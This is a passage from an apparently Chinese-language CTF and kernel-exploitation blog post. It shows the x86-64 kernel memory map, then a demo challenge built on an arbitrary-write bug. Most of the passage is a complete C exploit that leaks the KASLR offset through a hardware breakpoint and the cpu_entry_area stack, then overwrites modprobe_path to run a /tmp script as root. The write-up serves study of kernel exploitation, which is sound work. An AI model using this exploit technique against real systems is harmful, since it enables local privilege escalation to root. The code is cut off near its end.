class="hljs-string"> ffffc8ffffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffc90000000000 </span>|<span class="hljs-string">  -55    TB </span>|<span class="hljs-string"> ffffe8ffffffffff </span>|<span class="hljs-string">   32 TB </span>|<span class="hljs-string"> vmalloc/ioremap space (vmalloc_base)</span><br><span class="hljs-string"> ffffe90000000000 </span>|<span class="hljs-string">  -23    TB </span>|<span class="hljs-string"> ffffe9ffffffffff </span>|<span class="hljs-string">    1 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffea0000000000 </span>|<span class="hljs-string">  -22    TB </span>|<span class="hljs-string"> ffffeaffffffffff </span>|<span class="hljs-string">    1 TB </span>|<span class="hljs-string"> virtual memory map (vmemmap_base)</span><br><span class="hljs-string"> ffffeb0000000000 </span>|<span class="hljs-string">  -21    TB </span>|<span class="hljs-string"> ffffebffffffffff </span>|<span class="hljs-string">    1 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffec0000000000 </span>|<span class="hljs-string">  -20    TB </span>|<span class="hljs-string"> fffffbffffffffff </span>|<span class="hljs-string">   16 TB </span>|<span class="hljs-string"> KASAN shadow memory</span><br><span class="hljs-string">__________________</span>|<span class="hljs-string">____________</span>|<span class="hljs-string">__________________</span>|<span class="hljs-string">_________</span>|____________________________________________________________<br>                                                            |<span class="hljs-string"></span><br><span class="hljs-string">                                                            </span>|<span class="hljs-string"> Identical layout to the 56-bit one from here on:</span><br><span class="hljs-string">____________________________________________________________</span>|____________________________________________________________<br>                  |<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> fffffc0000000000 |<span class="hljs-string">   -4    TB </span>|<span class="hljs-string"> fffffdffffffffff </span>|<span class="hljs-string">    2 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string">                  </span>|<span class="hljs-string">            </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<span class="hljs-string"> vaddr_end for KASLR</span><br><span class="hljs-string"> fffffe0000000000 </span>|<span class="hljs-string">   -2    TB </span>|<span class="hljs-string"> fffffe7fffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> cpu_entry_area mapping</span><br><span class="hljs-string"> fffffe8000000000 </span>|<span class="hljs-string">   -1.5  TB </span>|<span class="hljs-string"> fffffeffffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffff0000000000 </span>|<span class="hljs-string">   -1    TB </span>|<span class="hljs-string"> ffffff7fffffffff </span>|<span class="hljs-string">  0.5 TB </span>|<span class="hljs-string"> %esp fixup stacks</span><br><span class="hljs-string"> ffffff8000000000 </span>|<span class="hljs-string"> -512    GB </span>|<span class="hljs-string"> ffffffeeffffffff </span>|<span class="hljs-string">  444 GB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffffef00000000 </span>|<span class="hljs-string">  -68    GB </span>|<span class="hljs-string"> fffffffeffffffff </span>|<span class="hljs-string">   64 GB </span>|<span class="hljs-string"> EFI region mapping space</span><br><span class="hljs-string"> ffffffff00000000 </span>|<span class="hljs-string">   -4    GB </span>|<span class="hljs-string"> ffffffff7fffffff </span>|<span class="hljs-string">    2 GB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string"> ffffffff80000000 </span>|<span class="hljs-string">   -2    GB </span>|<span class="hljs-string"> ffffffff9fffffff </span>|<span class="hljs-string">  512 MB </span>|<span class="hljs-string"> kernel text mapping, mapped to physical address 0</span><br><span class="hljs-string"> ffffffff80000000 </span>|<span class="hljs-string">-2048    MB </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br> ffffffffa0000000 |<span class="hljs-string">-1536    MB </span>|<span class="hljs-string"> fffffffffeffffff </span>|<span class="hljs-string"> 1520 MB </span>|<span class="hljs-string"> module mapping space</span><br><span class="hljs-string"> ffffffffff000000 </span>|<span class="hljs-string">  -16    MB </span>|<span class="hljs-string">                  </span>|<span class="hljs-string">         </span>|<br>    FIXADDR_START |<span class="hljs-string"> ~-11    MB </span>|<span class="hljs-string"> ffffffffff5fffff </span>|<span class="hljs-string"> ~0.5 MB </span>|<span class="hljs-string"> kernel-internal fixmap range, variable size and offset</span><br><span class="hljs-string"> ffffffffff600000 </span>|<span class="hljs-string">  -10    MB </span>|<span class="hljs-string"> ffffffffff600fff </span>|<span class="hljs-string">    4 kB </span>|<span class="hljs-string"> legacy vsyscall ABI</span><br><span class="hljs-string"> ffffffffffe00000 </span>|<span class="hljs-string">   -2    MB </span>|<span class="hljs-string"> ffffffffffffffff </span>|<span class="hljs-string">    2 MB </span>|<span class="hljs-string"> ... unused hole</span><br><span class="hljs-string">__________________</span>|<span class="hljs-string">____________</span>|<span class="hljs-string">__________________</span>|<span class="hljs-string">_________</span>|___________________________________________________________<br><br></code></pre></td></tr></table></figure><p>but在6.2及后续版本中，这块区域也被加上了一个偏移，通过<code>get_cpu_entry_area</code>可以很清楚的看到这一点</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240215123711.png" style="zoom:50%;" /><h1 id="0x02：好多好多的例题"><a href="#0x02：好多好多的例题" class="headerlink" title="0x02：好多好多的例题"></a>0x02：好多好多的例题</h1><h2 id="demo例题"><a href="#demo例题" class="headerlink" title="demo例题"></a>demo例题</h2><ul><li><a href="https://github.com/veritas501/hbp_attack_demo">https://github.com/veritas501/hbp_attack_demo</a></li></ul><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240202155116.png" style="zoom:50%;" /><p>十分白给的无限次数任意地址写8字节</p><p>直接按照上面分析的思路写即可，泄露kaslr之后用modprobe完成利用</p><h3 id="FINAL-EXP-modprobe解法"><a href="#FINAL-EXP-modprobe解法" class="headerlink" title="FINAL EXP   modprobe解法"></a>FINAL EXP   modprobe解法</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/keyctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/utsname.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CPU_ENTRY_AREA_DB_STACK_RCX_ADDR 0xfffffe0000010fb0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MMAP_ADDR 0x1234000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MMAP_SIZE 0x2000</span><br><br><span class="hljs-type">size_t</span> kernel_offset;<br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">size_t</span> modprobe_path = <span class="hljs-number">0xffffffff82e8b920</span>;<br><span class="hljs-type">int</span> dev_fd;<br><span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>];<br><span class="hljs-type">pid_t</span> hbp_pid;<br><span class="hljs-type">char</span> * mmap_addr;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span> addr;<br>    <span class="hljs-type">uint64_t</span> vul;<br>&#125;vuln;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span> <span class="hljs-params">(</span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pushf;&quot;</span></span><br><span class="hljs-params">        <span class="hljs-string">&quot;pop user_rflags;&quot;</span></span><br><span class="hljs-params">    )</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_binary</span><span class="hljs-params">(<span class="hljs-type">char</span>* buf, <span class="hljs-type">int</span> length)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Address info starting in %p:\n&quot;</span>, buf);<br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> output_buffer[<span class="hljs-number">80</span>];<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">80</span>);<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;(length % <span class="hljs-number">16</span> == <span class="hljs-number">0</span> ? length / <span class="hljs-number">16</span> : length / <span class="hljs-number">16</span> + <span class="hljs-number">1</span>); i++)&#123;<br>        <span class="hljs-type">char</span> temp_buffer[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-built_in">memset</span>(temp_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">0x10</span>);<br>        <span class="hljs-built_in">sprintf</span>(temp_buffer, <span class="hljs-string">&quot;%#5x&quot;</span>, index);<br>        <span class="hljs-built_in">strcpy</span>(output_buffer, temp_buffer);<br>        output_buffer[<span class="hljs-number">5</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">6</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">7</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">16</span>; j++)&#123;<br>            <span class="hljs-keyword">if</span>(index+j &gt;= length)<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;   &quot;</span>);<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;%02x &quot;</span>, ((<span class="hljs-type">int</span>)buf[index+j]) &amp; <span class="hljs-number">0xFF</span>);<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">isprint</span>(buf[index+j]))<br>                    output_buffer[<span class="hljs-number">58</span>+j] = <span class="hljs-string">&#x27;.&#x27;</span>;<br>                <span class="hljs-keyword">else</span><br>                    output_buffer[<span class="hljs-number">58</span>+j] = buf[index+j];<br>            &#125;<br>        &#125;<br>        output_buffer[<span class="hljs-number">55</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">56</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">57</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, output_buffer);<br>        <span class="hljs-built_in">memset</span>(output_buffer+<span class="hljs-number">58</span>, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">16</span>);<br>        index += <span class="hljs-number">16</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arb_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint64_t</span> vul)</span><br>&#123;<br>    vuln note;<br>    note.addr = addr;<br>    note.vul = vul;<br>    ioctl(dev_fd ,<span class="hljs-number">0</span> , &amp; note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_hbp</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">void</span>* addr)</span>     <br>&#123;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg), addr) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr0: %m\n&quot;</span>);<br>        kill(hbp_pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg) + <span class="hljs-number">56</span>, <span class="hljs-number">0xf0101</span>) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr7: %m\n&quot;</span>);<br>        kill(hbp_pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">change_rcx</span><span class="hljs-params">()</span><br>&#123;<br>    bind_cpu(<span class="hljs-number">1</span>);<span class="hljs-comment">/*这里不绑核问题也不大🤔*/</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] write cpu_entry_area DB_STACK -&gt; rcx&quot;</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        arb_write(CPU_ENTRY_AREA_DB_STACK_RCX_ADDR, <span class="hljs-number">0x80</span>);<br>    &#125;<br>    <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">hack_hbp</span><span class="hljs-params">()</span><br>&#123;<br>    bind_cpu(<span class="hljs-number">0</span>);<br>    ptrace(PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">utsname</span>* <span class="hljs-title">uts</span> =</span> (<span class="hljs-keyword">struct</span> utsname*)MMAP_ADDR;<br>    <span class="hljs-type">int</span> oob_idx = (<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> utsname) + <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>) - <span class="hljs-number">1</span>) / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>);<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        raise(SIGSTOP);<br>        uname(uts);<br>        <span class="hljs-keyword">if</span> (((<span class="hljs-type">uint64_t</span>*)uts)[oob_idx])<br>        &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] OOB Read Stack Data Successfully&quot;</span>);<br>            write(pipe_fd[<span class="hljs-number">1</span>], MMAP_ADDR, MMAP_SIZE);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">size_t</span> leak;<br>    <span class="hljs-type">char</span> data[<span class="hljs-number">0x40</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><br>    save_status();<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/vuln&quot;</span>,O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        err_exit(<span class="hljs-string">&quot;open device failed!&quot;</span>);<br>    &#125;<br>    <br>    mmap_addr = mmap(MMAP_ADDR, MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span>(!mmap_addr)<br>    &#123;<br>        err_exit(<span class="hljs-string">&quot;mmap failed!&quot;</span>);<br>    &#125;<br>    <br><br>    pipe(pipe_fd);<br>    <span class="hljs-type">pid_t</span> pid1, pid2;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] fork a process to trigger hbp&quot;</span>);<br>    pid1 = fork();<br>    <span class="hljs-keyword">if</span> (!pid1)<br>    &#123;<br>        hack_hbp();<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        <br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid1 &lt; <span class="hljs-number">0</span>)&#123;<br>        err_exit(<span class="hljs-string">&quot;fork pid1 failed!&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        waitpid(pid1, <span class="hljs-literal">NULL</span> ,<span class="hljs-literal">NULL</span>);<br>    &#125;<br><br>    pid2 = fork();<br>    <span class="hljs-keyword">if</span> (!pid2)<br>    &#123;<br>        change_rcx();<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (pid2 &lt; <span class="hljs-number">0</span>)&#123;<br>        err_exit(<span class="hljs-string">&quot;fork pid1 failed!&quot;</span>);<br>    &#125;<br><br>    create_hbp(pid1, MMAP_ADDR);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">fds</span> =</span> &#123; .fd = pipe_fd[<span class="hljs-number">0</span>], .events = POLLIN &#125;;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (ptrace(PTRACE_CONT, pid1, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>))<br>            err_exit(<span class="hljs-string">&quot;ptrace PTRACE_CONT&quot;</span>);<br>        waitpid(pid1, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br> <br>        <span class="hljs-type">int</span> res = poll(&amp;fds, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (res &gt; <span class="hljs-number">0</span> &amp;&amp; (fds.revents &amp; POLLIN))<br>        &#123;<br>            read(pipe_fd[<span class="hljs-number">0</span>], MMAP_ADDR, MMAP_SIZE);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// waitpid(pid2, NULL, NULL);</span><br><br>    print_binary(MMAP_ADDR+<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> utsname), <span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">memcpy</span>(&amp;leak, MMAP_ADDR+<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> utsname)+<span class="hljs-number">0X20</span>, <span class="hljs-number">8</span>);<br>    kernel_offset = leak -  <span class="hljs-number">0xffffffff810e0b32</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak is 0x%lx\n&quot;</span>, leak);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] kernel_offset is 0x%lx\n&quot;</span>, kernel_offset);<br><br>    modprobe_path = modprobe_path + kernel_offset;<br>    arb_write(modprobe_path, <span class="hljs-number">0x7465672f706d742f</span>);<br>    arb_write(modprobe_path + <span class="hljs-number">8</span>, <span class="hljs-number">0x6c6c656873</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;# make fake file magic not found&quot;</span>);<br>    system(<span class="hljs-string">&quot;echo &#x27;#!/bin/sh\nchmod 777 /flag&#x27;&gt;/tmp/getshell&quot;</span>);<br>    system(<span class="hljs-string">&quot;chmod +x /tmp/getshell&quot;</span>);<br><br>    system(<span class="hljs-string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27;&gt;/tmp/fake&quot;</span>);<br>    system(<span class="hljs-string">&quot;chmod +x /tmp/fake&quot;</span>);<br>    system(<span class="hljs-string">&quot;/tmp/fake&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;# get flag&quot;</span>);<br>    <span class="hljs-type">int</span> flag_fd = open(<span class="hljs-string">&quot;/flag&quot;</span>,O_RDONLY);<br>    <span class="hljs-keyword">if</span> (flag_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        err_exit(<span class="hljs-string">&quot;open flag failed!&quot;</span>);<br>    &#125;<br>    read(flag_fd, data, <span class="hljs-number">0x30</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] flag is %s\n&quot;</span>,data);<br><br>    <span class="hljs-keyword">return</span> <span 